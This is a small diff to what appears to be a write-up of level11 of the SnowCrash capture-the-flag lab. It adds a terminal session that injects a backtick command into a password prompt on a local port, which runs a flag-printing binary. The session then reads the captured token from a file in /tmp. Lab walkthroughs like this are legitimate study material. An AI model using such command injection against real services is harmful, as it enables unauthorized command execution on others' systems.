@@ -54,5 +54,9 @@ level11@SnowCrash:~$ nc -l 5151
 nc: Address already in use
 
 level11@SnowCrash:~$ nc localhost 5151
-Password: 
+Password: `/bin/getflag >/tmp/flag11`
+Erf nope..
+
+level11@SnowCrash:~$ cat /tmp/flag11
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
 ```
